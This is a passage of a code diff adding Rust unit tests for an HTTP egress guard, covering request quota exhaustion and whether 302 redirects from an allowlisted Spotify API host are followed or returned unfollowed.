+        g.send_scoped("app.x", &scope, &spotify_args())
+            .await
+            .unwrap();
+        g.send_scoped("app.x", &scope, &spotify_args())
+            .await
+            .unwrap();
+        let e = g
+            .send_scoped("app.x", &scope, &spotify_args())
+            .await
+            .unwrap_err();
+        assert_eq!(e.code, "quota_exhausted");
+        assert_eq!(t.requests.lock().unwrap().len(), 2);
+    }
+
+    #[tokio::test]
+    async fn first_hop_3xx_is_returned_unfollowed_only_for_marked_hosts() {
+        let redirect = TransportResponse {
+            status: 302,
+            headers: vec![(
+                "Location".to_string(),
+                "https://api.spotify.com/final".to_string(),
+            )],
+            body: vec![],
+            truncated: false,
+        };
+        for (marked, expect_status, expect_requests) in [(true, 302u64, 1usize), (false, 200, 2)] {
+            let t = Arc::new(
+                FakeTransport::default()
+                    .queue(Ok(ok_response()))
+                    .queue(Ok(redirect.clone())),
+            );
+            let mut row = EgressRuleRow::from_legacy_patterns(
+                vec![("api.spotify.com".to_string(), vec!["GET".to_string()])],
+                None,
+                HashMap::new(),
+            );
+            if marked {
+                row.unfollowed_redirect_hosts
+                    .insert("api.spotify.com".to_string());
+            }
+            let catalog = TestCatalog::new();
+            catalog.insert("app.x", row);
+            let g = EgressGuard::new(
+                Arc::clone(&t) as Arc<dyn HttpTransport>,
+                default_limits(),
+                catalog,
+                test_metrics(),
+                boxed(StaticFlag(true)),
+            )
+            .with_resolver(Arc::new(PublicResolver));
+            let out = g
+                .send(
+                    "app.x",
+                    &serde_json::json!({"method": "GET", "url": "https://api.spotify.com/resolve?u=1"}),
+                )
+                .await
+                .unwrap();
+            assert_eq!(out["status"], expect_status);
+            assert_eq!(t.requests.lock().unwrap().len(), expect_requests);
+            if marked {
+                assert_eq!(out["headers"][0]["value"], "https://api.spotify.com/final");
+            }
+        }
     }
 }
